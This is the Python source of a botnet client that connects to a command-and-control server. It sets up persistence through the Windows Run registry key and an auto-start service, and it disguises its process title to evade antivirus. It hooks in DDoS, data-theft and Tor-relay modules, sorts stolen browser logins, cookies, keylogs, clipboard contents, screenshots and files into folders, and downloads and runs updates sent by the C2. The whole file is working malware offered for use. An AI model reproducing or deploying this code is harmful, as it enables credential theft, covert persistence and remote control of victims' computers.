# -*- coding: utf-8 -*-

"""
bot_client.py – Ultra‑Pro Bot Client (Dynamic Key Version)
======================================================
* Generates a unique Session Key on startup
* Sends Key to Server during connection handshake
* Uses Session Key for all subsequent communications
* Dynamic Size Header support for any data size
* Colorful Terminal Interface with Colorama
* Timestamp and Serial Number for Steal Data Files
* Auto-Extract Steal Data to Organized Folders
* UPDATED: LIST command shows real bot information with Bot Number
* UPDATED: Receives Bot Number from C2 Server
* UPDATED: C2 Controlled Steal - Disable/Enable from C2 (FIXED)
* UPDATED: Receives STEAL_ENABLED/STEAL_DISABLED from C2 (FIXED)
* UPDATED: UPDATE command with progress flag and confirmation (FIXED)
* UPDATED: DOWNLOAD command added for file download (FIXED)
* UPDATED: Full update installation with C2 confirmation
* FIXED: Steal disabled status properly stops data stealing
* FIXED: Auto-Update module compatibility
* FIXED: Auto-send OS_INFO to C2 on connection
"""

import os
import sys
import time
import json
import socket
import threading
import platform
import logging
import queue
import subprocess
import base64
import secrets
import struct
import zlib
import shutil
from datetime import datetime
from typing import Optional, Dict, List

# --------------------------------------------------------------------------- #
# 🎨 Colorama for Windows Support
# --------------------------------------------------------------------------- #
try:
    from colorama import init, Fore, Back, Style, just_fix_windows_console
    init(autoreset=True)
    just_fix_windows_console()
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback ANSI codes
    class Fore:
        BLACK = '\033[30m'
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[39m'
        LIGHTBLACK_EX = '\033[90m'
        LIGHTRED_EX = '\033[91m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTYELLOW_EX = '\033[93m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTCYAN_EX = '\033[96m'
        LIGHTWHITE_EX = '\033[97m'

    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'
        RESET_ALL = '\033[0m'

# --------------------------------------------------------------------------- #
# 🎨 Color Functions with Windows Support
# --------------------------------------------------------------------------- #
class Colors:
    """Terminal colors with Windows support"""
    HEADER = Fore.MAGENTA if COLORAMA_AVAILABLE else '\033[95m'
    BLUE = Fore.BLUE if COLORAMA_AVAILABLE else '\033[94m'
    CYAN = Fore.CYAN if COLORAMA_AVAILABLE else '\033[96m'
    GREEN = Fore.GREEN if COLORAMA_AVAILABLE else '\033[92m'
    YELLOW = Fore.YELLOW if COLORAMA_AVAILABLE else '\033[93m'
    RED = Fore.RED if COLORAMA_AVAILABLE else '\033[91m'
    BOLD = Style.BRIGHT if COLORAMA_AVAILABLE else '\033[1m'
    UNDERLINE = '\033[4m'
    END = Style.RESET_ALL if COLORAMA_AVAILABLE else '\033[0m'
    WHITE = Fore.WHITE if COLORAMA_AVAILABLE else '\033[97m'
    MAGENTA = Fore.MAGENTA if COLORAMA_AVAILABLE else '\033[35m'
    GRAY = Fore.LIGHTBLACK_EX if COLORAMA_AVAILABLE else '\033[90m'
    LIGHT_GREEN = Fore.LIGHTGREEN_EX if COLORAMA_AVAILABLE else '\033[92m'
    LIGHT_CYAN = Fore.LIGHTCYAN_EX if COLORAMA_AVAILABLE else '\033[96m'
    LIGHT_YELLOW = Fore.LIGHTYELLOW_EX if COLORAMA_AVAILABLE else '\033[93m'

def print_colored(text: str, color: str = Colors.WHITE, bold: bool = False):
    """Print colored text to terminal"""
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.END}")
    else:
        print(f"{color}{text}{Colors.END}")

def print_header(text: str):
    """Print header with decoration"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.GREEN}{text.center(60)}{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")

def print_success(text: str):
    """Print success message"""
    print(f"{Colors.LIGHT_GREEN}✅ {text}{Colors.END}")

def print_error(text: str):
    """Print error message"""
    print(f"{Colors.RED}❌ {text}{Colors.END}")

def print_warning(text: str):
    """Print warning message"""
    print(f"{Colors.LIGHT_YELLOW}⚠️ {text}{Colors.END}")

def print_info(text: str):
    """Print info message"""
    print(f"{Colors.LIGHT_CYAN}ℹ️ {text}{Colors.END}")

def print_bot_status(text: str):
    """Print bot status"""
    print(f"{Colors.MAGENTA}🤖 {text}{Colors.END}")

def print_data(text: str):
    """Print data transfer info"""
    print(f"{Colors.GRAY}📦 {text}{Colors.END}")

# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #
try:
    from config import C2_IP, C2_PORT
except ImportError:
    C2_IP = "127.0.0.1"
    C2_PORT = 4444

# --------------------------------------------------------------------------- #
# Debug Mode - OFF
# --------------------------------------------------------------------------- #
DEBUG = False

def debug_log(msg: str, level="INFO"):
    """Debug log - now disabled"""
    pass

# --------------------------------------------------------------------------- #
# 📁 Data Extractor Class - Auto Extract Steal Data
# --------------------------------------------------------------------------- #
class DataExtractor:
    """স্টিল ডেটা এক্সট্র্যাক্ট করে ফোল্ডারে সাজানোর ক্লাস"""

    @staticmethod
    def create_folder_structure(base_path: str):
        """ফোল্ডার স্ট্রাকচার তৈরি করুন"""
        folders = [
            "browsers/chrome",
            "browsers/edge",
            "browsers/brave",
            "browsers/firefox",
            "keylogs",
            "clipboard",
            "screenshots",
            "mined_files",
            "system_info"
        ]

        for folder in folders:
            path = os.path.join(base_path, folder)
            os.makedirs(path, exist_ok=True)

        return base_path

    @staticmethod
    def save_browser_data(data: dict, base_path: str):
        """ব্রাউজার ডেটা আলাদা ফোল্ডারে সেভ করুন"""
        if 'browsers' not in data:
            return 0

        browsers = data['browsers']
        saved_count = 0

        # Chrome
        if 'Chrome' in browsers:
            chrome_data = browsers['Chrome']
            save_path = os.path.join(base_path, 'browsers', 'chrome')

            if 'logins' in chrome_data and chrome_data['logins']:
                with open(os.path.join(save_path, 'logins.json'), 'w', encoding='utf-8') as f:
                    json.dump(chrome_data['logins'], f, indent=2, ensure_ascii=False)
                saved_count += 1

            if 'cookies' in chrome_data and chrome_data['cookies']:
                with open(os.path.join(save_path, 'cookies.json'), 'w', encoding='utf-8') as f:
                    json.dump(chrome_data['cookies'], f, indent=2, ensure_ascii=False)
                saved_count += 1

        # Edge
        if 'Edge' in browsers:
            edge_data = browsers['Edge']
            save_path = os.path.join(base_path, 'browsers', 'edge')

            if 'logins' in edge_data and edge_data['logins']:
                with open(os.path.join(save_path, 'logins.json'), 'w', encoding='utf-8') as f:
                    json.dump(edge_data['logins'], f, indent=2, ensure_ascii=False)
                saved_count += 1

            if 'cookies' in edge_data and edge_data['cookies']:
                with open(os.path.join(save_path, 'cookies.json'), 'w', encoding='utf-8') as f:
                    json.dump(edge_data['cookies'], f, indent=2, ensure_ascii=False)
                saved_count += 1

        # Brave
        if 'Brave' in browsers:
            brave_data = browsers['Brave']
            save_path = os.path.join(base_path, 'browsers', 'brave')

            if 'logins' in brave_data and brave_data['logins']:
                with open(os.path.join(save_path, 'logins.json'), 'w', encoding='utf-8') as f:
                    json.dump(brave_data['logins'], f, indent=2, ensure_ascii=False)
                saved_count += 1

            if 'cookies' in brave_data and brave_data['cookies']:
                with open(os.path.join(save_path, 'cookies.json'), 'w', encoding='utf-8') as f:
                    json.dump(brave_data['cookies'], f, indent=2, ensure_ascii=False)
                saved_count += 1

        # Firefox
        if 'Firefox' in browsers:
            firefox_data = browsers['Firefox']
            save_path = os.path.join(base_path, 'browsers', 'firefox')

            if 'entries' in firefox_data and firefox_data['entries']:
                with open(os.path.join(save_path, 'data.json'), 'w', encoding='utf-8') as f:
                    json.dump(firefox_data['entries'], f, indent=2, ensure_ascii=False)
                saved_count += 1

        return saved_count

    @staticmethod
    def save_keylogs(data: dict, base_path: str):
        """কিলগ ডেটা সেভ করুন"""
        if 'keylogs' in data and data['keylogs']:
            save_path = os.path.join(base_path, 'keylogs', 'keylogs.txt')
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(data['keylogs'])
            return True
        return False

    @staticmethod
    def save_clipboard(data: dict, base_path: str):
        """ক্লিপবোর্ড ডেটা সেভ করুন"""
        if 'clipboard' in data and data['clipboard']:
            save_path = os.path.join(base_path, 'clipboard', 'clipboard.txt')
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(data['clipboard'])
            return True
        return False

    @staticmethod
    def save_screenshot(data: dict, base_path: str):
        """স্ক্রিনশট সেভ করুন"""
        if 'screenshot' in data and data['screenshot']:
            try:
                screenshot_data = base64.b64decode(data['screenshot'])
                save_path = os.path.join(base_path, 'screenshots', 'screenshot.png')
                with open(save_path, 'wb') as f:
                    f.write(screenshot_data)
                return True
            except Exception as e:
                print_warning(f"Screenshot save failed: {e}")
        return False

    @staticmethod
    def save_mined_files(data: dict, base_path: str):
        """মাইন করা ফাইল সেভ করুন"""
        if 'mined_files' in data and data['mined_files']:
            save_path = os.path.join(base_path, 'mined_files')
            saved_count = 0

            for filename, content in data['mined_files'].items():
                try:
                    file_data = base64.b64decode(content)
                    safe_filename = filename.replace('/', '_').replace('\\', '_')
                    file_path = os.path.join(save_path, safe_filename)

                    with open(file_path, 'wb') as f:
                        f.write(file_data)
                    saved_count += 1
                except Exception as e:
                    print_warning(f"Failed to save {filename}: {e}")

            return saved_count
        return 0

    @staticmethod
    def save_system_info(data: dict, base_path: str):
        """সিস্টেম ইনফো সেভ করুন"""
        system_info = {
            'timestamp': data.get('timestamp', ''),
            'os': data.get('os', ''),
            'hostname': data.get('hostname', ''),
        }

        save_path = os.path.join(base_path, 'system_info', 'system_info.json')
        with open(save_path, 'w', encoding='utf-8') as f:
            json.dump(system_info, f, indent=2, ensure_ascii=False)
        return True

    @classmethod
    def extract(cls, json_file: str, output_dir: str = None) -> str:
        """JSON ফাইল থেকে ডেটা এক্সট্র্যাক্ট করুন"""
        if output_dir is None:
            base_name = os.path.splitext(os.path.basename(json_file))[0]
            output_dir = f"extracted_{base_name}"

        # JSON পড়ুন
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception as e:
            print_error(f"Failed to read JSON: {e}")
            return None

        # ফোল্ডার তৈরি করুন
        cls.create_folder_structure(output_dir)

        # ডেটা এক্সট্র্যাক্ট করুন
        stats = {
            'browser_files': cls.save_browser_data(data, output_dir),
            'keylogs': cls.save_keylogs(data, output_dir),
            'clipboard': cls.save_clipboard(data, output_dir),
            'screenshot': cls.save_screenshot(data, output_dir),
            'mined_files': cls.save_mined_files(data, output_dir),
            'system_info': cls.save_system_info(data, output_dir)
        }

        # সারাংশ তৈরি করুন
        summary = {
            'extracted_at': datetime.now().isoformat(),
            'source_file': json_file,
            'output_directory': output_dir,
            'stats': stats
        }

        with open(os.path.join(output_dir, 'extraction_summary.json'), 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

        return output_dir

# --------------------------------------------------------------------------- #
# Local Modules (Fallbacks) - Persistence Fixed
# --------------------------------------------------------------------------- #
try:
    from modules.encryption import encrypt_data, decrypt_data
except ImportError:
    def encrypt_data(data, key=None):
        if isinstance(data, str):
            data = data.encode()
        encrypted = bytearray()
        for i, b in enumerate(data):
            encrypted.append(b ^ key[i % len(key)])
        result = base64.b64encode(bytes(encrypted)).decode('utf-8')
        if len(result) % 4 != 0:
            result += '=' * (4 - len(result) % 4)
        return result

    def decrypt_data(data, key=None):
        try:
            if len(data) % 4 != 0:
                data += '=' * (4 - len(data) % 4)
            decoded = base64.b64decode(data)
            decrypted = bytearray()
            for i, b in enumerate(decoded):
                decrypted.append(b ^ key[i % len(key)])
            return bytes(decrypted).decode('utf-8')
        except Exception as e:
            raise ValueError(f"Decryption failed: {e}")

# ✅ Persistence Module - Fixed with proper Windows support
try:
    from modules.persistence import add_to_startup, create_service
    PERSISTENCE_AVAILABLE = True
    print_success("Persistence module loaded successfully")
except ImportError as e:
    PERSISTENCE_AVAILABLE = False
    print_warning(f"Persistence module not found: {e}")

    def add_to_startup():
        """Add to Windows startup (fallback)"""
        try:
            if platform.system() == "Windows":
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "BotClient", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                winreg.CloseKey(key)
                print_success("Added to Windows Startup (fallback)")
        except Exception as e:
            print_warning(f"Failed to add to startup: {e}")

    def create_service():
        """Create Windows service (fallback)"""
        try:
            if platform.system() == "Windows":
                import subprocess
                service_name = "BotClientService"
                cmd = f'sc create {service_name} binPath= "{sys.executable} {os.path.abspath(__file__)}" start= auto'
                subprocess.run(cmd, shell=True, capture_output=True)
                print_success(f"Service {service_name} created (fallback)")
        except Exception as e:
            print_warning(f"Failed to create service: {e}")

try:
    from modules.anti_av import bypass_antivirus, hide_process
    ANTI_AV_AVAILABLE = True
    print_success("Anti-AV module loaded successfully")
except ImportError:
    ANTI_AV_AVAILABLE = False
    print_warning("Anti-AV module not found - using fallback")

    def bypass_antivirus():
        """Bypass antivirus (fallback)"""
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW("System Idle Process")
        except:
            pass

    def hide_process():
        """Hide process (fallback)"""
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW("Windows System Process")
        except:
            pass

# ✅ Auto-Update Module - Fixed import
try:
    from modules.auto_update import manual_update, start_auto_update
    AUTO_UPDATE_AVAILABLE = True
    print_success("Auto-Update module loaded successfully")
except ImportError as e:
    AUTO_UPDATE_AVAILABLE = False
    print_warning(f"Auto-Update module not found: {e}")
    def manual_update(client):
        return False, "Auto-update module not available"
    def start_auto_update(client):
        print_info("Auto-update module not available")

try:
    from modules.ddos import start_ddos
except ImportError:
    def start_ddos(target_ip, target_port, duration, attack_type): pass

try:
    from modules.data_steal import start_data_steal, stop_data_steal, set_bot_client, enable_steal, disable_steal
except ImportError:
    def start_data_steal(client=None): pass
    def stop_data_steal(): pass
    def set_bot_client(client): pass
    def enable_steal(): pass
    def disable_steal(): pass

try:
    from modules.tor_relay import TorRelayManager, get_tor_relay_info
except ImportError:
    class TorRelayManager:
        def start(self): pass
        def stop(self): pass
    def get_tor_relay_info(): return {"status": "disabled"}

# --------------------------------------------------------------------------- #
# Logging - Minimal
# --------------------------------------------------------------------------- #
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s – %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("BotClient")

# --------------------------------------------------------------------------- #
# Bot Client Class
# --------------------------------------------------------------------------- #
class BotClient:
    def __init__(self):
        print_header("🤖 BOT CLIENT INITIALIZING")

        self.os_name = platform.system()
        self.os_version = platform.version()
        self.bot_name = "botnet"
        self._start_time = time.time()  # Bot start time for uptime
        self.bot_number = 0  # Bot Number (will be assigned by C2)
        self.steal_enabled = True  # ✅ Steal status from C2
        self._update_in_progress = False  # ✅ UPDATE progress flag

        # Generate a unique 32-byte key for this session
        self.session_key = secrets.token_bytes(32)
        print_info(f"Session Key generated: {base64.b64encode(self.session_key).decode()[:20]}...")

        self.socket = None
        self.connected = False
        self.shutdown_flag = False

        self.command_queue = queue.Queue()
        self.data_steal_running = False
        self.tor_manager = TorRelayManager() if 'TorRelayManager' in globals() else None
        self.tor_running = False

        # স্টিল ডেটা কাউন্টার এবং ফোল্ডার
        self.steal_counter = 0
        self.steal_dir = "steal_data_bot"
        self.extracted_dir = "extracted_data_bot"
        os.makedirs(self.steal_dir, exist_ok=True)
        os.makedirs(self.extracted_dir, exist_ok=True)
        print_info(f"Steal Data Folder: {Colors.YELLOW}{self.steal_dir}{Colors.END}")
        print_info(f"Extracted Data Folder: {Colors.YELLOW}{self.extracted_dir}{Colors.END}")

        # Set bot client reference for data steal module
        try:
            set_bot_client(self)
            print_success("Bot client registered with data steal module")
        except:
            pass

        self._setup_persistence_and_evade()
        print_success("BotClient initialization complete")

    def _setup_persistence_and_evade(self):
        """Setup persistence and AV evasion with proper error handling"""
        try:
            # Anti-AV evasion
            try:
                bypass_antivirus()
                hide_process()
                print_success("Anti-AV evasion configured")
            except Exception as e:
                print_warning(f"Anti-AV evasion failed: {e}")

            # Persistence
            try:
                add_to_startup()
                create_service()
                print_success("Persistence configured")
            except Exception as e:
                print_warning(f"Persistence configuration failed: {e}")

        except Exception as exc:
            print_error(f"Failed to set up persistence / AV evasion: {exc}")

    def _get_uptime(self) -> str:
        """বট চালু থাকার সময় দেখান"""
        uptime_seconds = int(time.time() - self._start_time)
        hours = uptime_seconds // 3600
        minutes = (uptime_seconds % 3600) // 60
        seconds = uptime_seconds % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    # --------------------------------------------------------------------- #
    # 🔥 CORE: Dynamic Size Send/Receive
    # --------------------------------------------------------------------- #

    def _recv_exact(self, size: int) -> Optional[bytes]:
        """Receive exact number of bytes"""
        if size <= 0:
            return b''

        data = b''
        while len(data) < size:
            try:
                chunk_size = min(8192, size - len(data))
                chunk = self.socket.recv(chunk_size)

                if not chunk:
                    return None

                data += chunk

            except socket.timeout:
                continue
            except Exception:
                return None

        return data

    def _send(self, payload: str) -> bool:
        """Send data with size header and encryption"""
        if not self.connected or not self.socket:
            return False

        try:
            encrypted = encrypt_data(payload, self.session_key)
            if isinstance(encrypted, str):
                encrypted = encrypted.encode('utf-8')

            data_size = len(encrypted)
            size_header = struct.pack('>I', data_size)

            self.socket.sendall(size_header + encrypted)
            return True

        except Exception as exc:
            log.error(f"Failed to send data: {exc}")
            return False

    def _receive(self) -> Optional[str]:
        """Receive data with size header and decryption"""
        if not self.connected or not self.socket:
            return None

        try:
            self.socket.settimeout(60)
            size_header = self._recv_exact(4)
            if not size_header:
                return None

            data_size = struct.unpack('>I', size_header)[0]

            if data_size > 50 * 1024 * 1024:
                log.warning(f"Data size {data_size} exceeds 50MB limit")
                return None

            if data_size == 0:
                return ""

            data = self._recv_exact(data_size)
            if not data:
                return None

            try:
                text_data = data.decode('utf-8', errors='ignore').strip()

                if not text_data:
                    return None

                if len(text_data) % 4 != 0:
                    padding = 4 - (len(text_data) % 4)
                    if padding <= 2:
                        text_data += '=' * padding

                decrypted = decrypt_data(text_data, self.session_key)

                # ✅ Bot Number message - return None
                if decrypted and decrypted.startswith("BOT_NUMBER:"):
                    try:
                        self.bot_number = int(decrypted.split(":")[1])
                        print_success(f"🤖 Assigned Bot Number: #{self.bot_number}")
                    except:
                        pass
                    return None

                # ✅ Steal status update - Return the command for processing
                if decrypted and decrypted == "STEAL_ENABLED":
                    self.steal_enabled = True
                    print_success("✅ Data Steal ENABLED by C2")
                    return "STEAL_ENABLED"

                if decrypted and decrypted == "STEAL_DISABLED":
                    self.steal_enabled = False
                    print_warning("⚠️ Data Steal DISABLED by C2")
                    # ✅ Stop data steal if running
                    if self.data_steal_running:
                        try:
                            disable_steal()
                            stop_data_steal()
                            self.data_steal_running = False
                            print_info("Data steal stopped due to C2 disable")
                        except Exception as e:
                            print_error(f"Error stopping steal: {e}")
                    return "STEAL_DISABLED"

                # ✅ Old format compatibility
                if decrypted and "Data Steal is currently DISABLED" in decrypted:
                    self.steal_enabled = False
                    print_warning("⚠️ Data Steal DISABLED by C2")
                    if self.data_steal_running:
                        try:
                            disable_steal()
                            stop_data_steal()
                            self.data_steal_running = False
                            print_info("Data steal stopped due to C2 disable")
                        except Exception as e:
                            print_error(f"Error stopping steal: {e}")
                    return "STEAL_DISABLED"

                if decrypted and "Data Steal ENABLED" in decrypted:
                    self.steal_enabled = True
                    print_success("✅ Data Steal ENABLED by C2")
                    return "STEAL_ENABLED"

                # ✅ Handle UPDATE response from C2
                if decrypted and decrypted == "UPDATE_AVAILABLE":
                    print_success("✅ Update available from C2!")
                    return "UPDATE_AVAILABLE"

                if decrypted and decrypted == "No update available":
                    print_info("ℹ️ No update available")
                    return "No update available"

                # ✅ Handle UPDATE confirmation from C2
                if decrypted and decrypted == "UPDATE_INSTALLED_SUCCESSFULLY":
                    print_success("✅ Update installed successfully on C2!")
                    self._update_in_progress = False
                    return "UPDATE_INSTALLED_SUCCESSFULLY"

                if decrypted and decrypted == "UPDATE_INSTALLATION_STARTED":
                    print_info("🔄 Update installation started on C2...")
                    return "UPDATE_INSTALLATION_STARTED"

                if decrypted and decrypted.startswith("UPDATE_INSTALLATION_ERROR:"):
                    error_msg = decrypted.split(":", 1)[1] if ":" in decrypted else "Unknown"
                    print_error(f"❌ Update error on C2: {error_msg}")
                    self._update_in_progress = False
                    return decrypted

                return decrypted

            except Exception:
                return None

        except socket.timeout:
            return None
        except Exception as exc:
            log.error(f"Failed to receive data: {exc}")
            return None

    def _connect_to_c2(self) -> bool:
        """Connect to C2 with dynamic size key exchange"""
        print_info(f"Connecting to C2 at {Colors.YELLOW}{C2_IP}:{C2_PORT}{Colors.END}...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((C2_IP, C2_PORT))
            self.socket = sock

            key_b64 = base64.b64encode(self.session_key).decode('utf-8')
            key_bytes = key_b64.encode('utf-8')

            size_header = struct.pack('>I', len(key_bytes))
            self.socket.sendall(size_header + key_bytes)

            self.connected = True
            print_success(f"Connected to C2 at {C2_IP}:{C2_PORT}")
            log.info(f"Connected to C2 at {C2_IP}:{C2_PORT} (Key Sent)")

            # ✅✅✅ OS_INFO স্বয়ংক্রিয়ভাবে পাঠান ✅✅✅
            try:
                os_name = self.os_name
                os_version = self.os_version
                os_info = f"OS_INFO:{os_name}|{os_version}"
                self._send(os_info)
                print_info(f"📤 Auto-sent OS info to C2: {os_name} {os_version}")
                log.info(f"Auto-sent OS info to C2: {os_name} {os_version}")
            except Exception as e:
                log.warning(f"Failed to send OS info: {e}")

            return True

        except socket.timeout:
            print_error("Connection timeout!")
            log.warning("Connection to C2 timed out.")
            self.connected = False
            return False
        except ConnectionRefusedError:
            print_error(f"Connection refused! C2 not running on {C2_IP}:{C2_PORT}")
            log.warning("Connection to C2 refused.")
            self.connected = False
            return False
        except Exception as exc:
            print_error(f"Connection failed: {exc}")
            log.warning(f"Connection to C2 failed: {exc}")
            self.connected = False
            return False

    # --------------------------------------------------------------------- #
    # 📁 Data Storage with Timestamp, Serial Number and Auto-Extract
    # --------------------------------------------------------------------- #

    def _save_and_extract_steal_data(self, data: dict) -> tuple:
        """স্টিল ডেটা সেভ করুন এবং অটো-এক্সট্র্যাক্ট করুন"""

        # 1. কাউন্টার বাড়ান
        self.steal_counter += 1

        # 2. টাইমস্ট্যাম্প তৈরি করুন
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # 3. JSON ফাইল সেভ করুন
        json_filename = f"steal_bot_{self.steal_counter:03d}_{timestamp}.json"
        json_path = os.path.join(self.steal_dir, json_filename)

        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        size = os.path.getsize(json_path)
        print_data(f"JSON saved: {json_filename} ({size:,} bytes)")

        # 4. Auto-Extract করুন
        print_info("🔄 Auto-extracting data...")
        extracted_folder = f"{self.extracted_dir}/extracted_{self.steal_counter:03d}_{timestamp}"

        try:
            extractor = DataExtractor()
            output_dir = extractor.extract(json_path, extracted_folder)

            if output_dir:
                print_success(f"✅ Data extracted to: {output_dir}")
                log.info(f"Extracted steal data to: {output_dir}")
                return json_path, output_dir
            else:
                print_warning("Extraction failed, but JSON saved")
                return json_path, None

        except Exception as e:
            print_error(f"Extraction error: {e}")
            return json_path, None

    def _list_steal_files(self) -> str:
        """স্টিল ডেটা ফাইলের তালিকা দেখান"""
        if not os.path.exists(self.steal_dir):
            return "📁 No steal data found."

        files = sorted(os.listdir(self.steal_dir))
        if not files:
            return "📁 No steal data found."

        result = ["📁 Steal Data Files (Bot):"]
        result.append("=" * 70)
        result.append(f"{'#':<5} {'Filename':<45} {'Size':<12} {'Date':<20}")
        result.append("-" * 70)

        total_size = 0
        for i, file in enumerate(files, 1):
            filepath = os.path.join(self.steal_dir, file)
            size = os.path.getsize(filepath)
            total_size += size
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d %H:%M:%S")

            if size > 1024 * 1024:
                size_str = f"{size / (1024*1024):.2f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.2f} KB"
            else:
                size_str = f"{size} B"

            result.append(f"{i:>3}. {file:<45} {size_str:>10}  {mtime}")

        result.append("-" * 70)
        result.append(f"Total: {len(files)} files, {total_size:,} bytes")

        # ✅ এক্সট্র্যাক্টেড ফোল্ডারের তথ্য দেখান
        if os.path.exists(self.extracted_dir):
            extracted_folders = [f for f in os.listdir(self.extracted_dir) if os.path.isdir(os.path.join(self.extracted_dir, f))]
            if extracted_folders:
                result.append("")
                result.append("📁 Extracted Folders:")
                result.append("-" * 70)
                for folder in sorted(extracted_folders, reverse=True)[:5]:
                    folder_path = os.path.join(self.extracted_dir, folder)
                    if os.path.exists(folder_path):
                        file_count = sum([len(files) for r, d, files in os.walk(folder_path)])
                        result.append(f"   📂 {folder} ({file_count} files)")
                if len(extracted_folders) > 5:
                    result.append(f"   ... and {len(extracted_folders) - 5} more folders")

        return "\n".join(result)

    # ======================================================================== #
    # ✅ UPDATE: Download and Install Update with Confirmation
    # ======================================================================== #

    def _download_and_install_update(self):
        """DOWNLOAD এবং INSTALL update - কনফার্মেশন সহ"""
        try:
            print_info("📥 Downloading update file from C2...")

            # Send DOWNLOAD command to C2
            self._send("DOWNLOAD modules/auto_update.py")

            # Wait for download with progress
            downloaded = False
            for i in range(15):  # 15 seconds timeout
                time.sleep(1)
                if os.path.exists("modules/auto_update.py"):
                    file_size = os.path.getsize("modules/auto_update.py")
                    if file_size > 100:  # Valid file size
                        downloaded = True
                        break
                if i % 3 == 0:
                    progress = min(i // 3 + 1, 5)
                    print_data(f"⏳ Downloading... [{'█' * progress}{'░' * (5 - progress)}]")

            if not downloaded:
                print_error("❌ Update download failed - timeout")
                self._send("UPDATE_DOWNLOAD_FAILED")
                self._update_in_progress = False
                return False

            file_size = os.path.getsize("modules/auto_update.py")
            print_success(f"✅ Update file downloaded successfully!")
            print_info(f"📦 File size: {file_size:,} bytes")

            # Verify file content
            try:
                with open("modules/auto_update.py", 'r', encoding='utf-8') as f:
                    content = f.read()
                    if len(content) < 50:
                        print_warning("⚠️ Downloaded file seems corrupted")
                        self._send("UPDATE_FILE_CORRUPTED")
                        self._update_in_progress = False
                        return False
                print_success("✅ File integrity verified")
            except Exception as e:
                print_error(f"❌ File verification failed: {e}")
                self._send(f"UPDATE_VERIFICATION_FAILED: {e}")
                self._update_in_progress = False
                return False

            # Send installation started message
            self._send("UPDATE_INSTALLATION_STARTED")

            # Install update
            print_info("🔄 Installing update...")
            print_info("📌 Current bot will be replaced with new version")

            try:
                if platform.system() == "Windows":
                    subprocess.Popen(
                        ["python", "modules/auto_update.py"],
                        creationflags=subprocess.CREATE_NEW_CONSOLE
                    )
                    print_success("✅ Update installed successfully!")
                    print_info("📌 New bot instance started in new console window")
                else:
                    subprocess.Popen(
                        ["python3", "modules/auto_update.py"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        start_new_session=True
                    )
                    print_success("✅ Update installed successfully!")
                    print_info("📌 New bot instance started in background")
            except Exception as e:
                print_error(f"❌ Failed to start update: {e}")
                self._send(f"UPDATE_START_FAILED: {e}")
                self._update_in_progress = False
                return False

            # Send confirmation to C2
            self._send("UPDATE_INSTALLED_SUCCESSFULLY")

            # Log the update
            log.info(f"✅ Update installed successfully at {datetime.now()}")
            log.info(f"📦 Update file: modules/auto_update.py ({file_size} bytes)")

            # Show summary
            print("")
            print("╔══════════════════════════════════════════════════════════════╗")
            print("║                    ✅ UPDATE COMPLETE                      ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print(f"║ 📦 File     : modules/auto_update.py                        ║")
            print(f"║ 📊 Size     : {file_size:,} bytes{' ' * (35 - len(str(file_size)))} ║")
            print(f"║ 🕐 Time     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<44} ║")
            print("║ 📌 Status   : ✅ Installed Successfully                    ║")
            print("╚══════════════════════════════════════════════════════════════╝")

            self._update_in_progress = False
            return True

        except Exception as e:
            print_error(f"❌ Update installation failed: {e}")
            self._send(f"UPDATE_INSTALLATION_ERROR: {e}")
            self._update_in_progress = False
            return False

    def _run_update(self):
        """Update ব্যাকগ্রাউন্ডে চালান"""
        try:
            success, message = manual_update(self)
            if success:
                print_success(f"✅ {message}")
                # If update check initiated, wait for response
                if "Update check initiated" in message:
                    time.sleep(3)  # Wait for C2 response
                    # Download and install if update available
                    if os.path.exists("modules/auto_update.py"):
                        self._download_and_install_update()
            else:
                print_warning(f"⚠️ {message}")
        except Exception as e:
            print_error(f"Update error: {e}")
        finally:
            self._update_in_progress = False

    # ======================================================================== #
    # ✅ NEW: Send and Receive method for DOWNLOAD command
    # ======================================================================== #

    def _send_and_receive(self, command: str, timeout: int = 10) -> Optional[str]:
        """Send command and wait for response from C2"""
        try:
            # Send the command
            if not self._send(command):
                log.error(f"Failed to send command: {command}")
                return None

            # Wait for response from command queue
            start_time = time.time()
            while time.time() - start_time < timeout:
                try:
                    # Check if there's a response in the queue
                    response = self.command_queue.get(timeout=0.5)
                    if response:
                        return response
                except queue.Empty:
                    continue
                except Exception as e:
                    log.error(f"Queue error: {e}")
                    return None

            log.warning(f"Timeout waiting for response to: {command}")
            return None

        except Exception as e:
            log.error(f"_send_and_receive error: {e}")
            return None

